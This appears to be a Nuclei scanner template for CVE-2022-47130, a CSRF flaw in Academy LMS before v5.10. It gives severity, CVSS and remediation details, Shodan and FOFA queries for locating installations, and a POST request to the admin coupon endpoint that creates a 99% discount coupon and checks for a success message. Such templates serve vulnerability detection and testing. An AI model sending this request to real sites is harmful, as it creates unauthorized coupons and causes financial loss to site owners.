id: CVE-2022-47130

info:
  name: Academy LMS CSRF Coupon Creation Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A CSRF vulnerability in Academy LMS before v5.10 allows an attacker to create a discount coupon by tricking an authenticated admin into visiting a malicious page.
  impact: |
    An attacker can create unauthorized coupons, leading to financial loss and abuse of discounts.
  remediation: |
    Implement CSRF protection mechanisms such as unique tokens for each request.
  reference:
    - https://xpsec.co/blog/academy-lms-5-10-coupon-csrf
    - https://github.com/OpenXP-Research/CVE-2022-47130
    - https://portswigger.net/web-security/csrf
    - https://www.linkedin.com/in/xvinicius/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cve-id: CVE-2022-47130
    cwe-id: CWE-352
    epss-score: 0.00075
    epss-percentile: 0.34044
    cpe: cpe:2.3:a:creativeitem:academy_lms:*:*:*:*:*:*:*:*
  metadata:
    vendor: creativeitem
    product: academy_lms
    shodan-query: html:"Academy LMS"
    fofa-query: body="academy lms"

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/coupons/add"

    body: |
      code=vinix&discount_percentage=99&expiry_date=12/11/2022

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Coupon created successfully"
        part: body
